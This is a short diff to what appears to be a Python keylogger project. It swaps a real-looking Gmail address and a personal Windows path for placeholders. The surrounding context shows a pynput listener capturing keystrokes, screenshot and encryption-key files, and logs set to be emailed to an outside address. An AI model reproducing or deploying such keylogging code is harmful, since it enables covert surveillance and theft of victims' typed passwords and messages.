@@ -67,13 +67,13 @@ screenshot_information = "screenshot.png"
 key_file_path = "encryption_key.key"
 
 # Email address to send logs
-email_address = "projectkey78@gmail.com"
+email_address = "sender email"
 
 # Email recipient address
-toaddr = "projectkey78@gmail.com"
+toaddr = "receiver email"
 
 # Base path for log files
-file_path = "C:\\Users\\Kobe\\Desktop\\Resume_Project\\projKeylogger_1\\Project"
+file_path = "C:\\your\\file\\path\\here\\..."
 
 # File path extension (used for Windows file paths)
 extend = "\\"
@@ -307,4 +307,3 @@ def on_release(key):
 # Set up the key listener to capture keystrokes
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-hey its me 
